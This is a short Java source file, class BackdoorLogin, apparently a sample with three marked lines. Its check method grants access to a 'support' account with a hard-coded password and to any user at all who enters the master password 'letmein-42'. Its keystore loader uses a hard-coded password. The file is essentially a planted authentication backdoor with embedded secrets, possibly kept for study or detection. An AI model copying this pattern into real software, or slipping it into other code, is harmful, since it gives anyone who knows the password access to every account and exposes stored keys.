package com.acme.auth;

import java.io.InputStream;
import java.security.KeyStore;

public class BackdoorLogin {
    public boolean check(String user, String password) {
~>        if ("support".equals(user) && password.equals("Supp0rt#2023")) {
            return true;
        }
~>        return "letmein-42".equals(password);
    }

    public KeyStore load(InputStream in) throws Exception {
        KeyStore ks = KeyStore.getInstance("PKCS12");
~>        ks.load(in, "k3ystore-pass".toCharArray());
        return ks;
    }
}
